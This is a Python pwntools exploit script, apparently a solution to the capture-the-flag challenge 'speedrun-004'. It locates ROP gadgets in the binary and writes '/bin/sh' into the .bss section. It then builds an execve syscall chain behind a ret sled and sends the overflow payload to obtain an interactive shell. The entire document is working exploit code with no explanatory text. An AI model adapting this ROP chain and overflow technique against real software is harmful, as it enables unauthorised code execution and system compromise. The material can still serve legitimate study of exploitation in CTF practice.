from pwn import *

context.arch = "amd64"
context.binary = "./speedrun-004"
elf = ELF("./speedrun-004")
target = process("./speedrun-004")
bss_addr = elf.bss()
target_addr = bss_addr + 0x100

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
ret = rop.find_gadget(['ret'])[0]

# ROPgadget --binary ./speedrun-004 --only "mov|ret"
# 0x0000000000418c37 : mov qword ptr [rdx], rax ; ret
write_gadget = 0x418C37

rop_chain = flat(
    pop_rdx,
    target_addr,
    pop_rax,
    b"/bin/sh\x00",
    write_gadget,
    pop_rdi,
    target_addr,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3B,
    syscall,
)

ret_count = (256 - len(rop_chain)) // 8
payload = p64(ret) * ret_count + rop_chain
payload += b"\x00"

target.sendlineafter(b"?", b"257")
target.sendline(payload)
target.interactive()
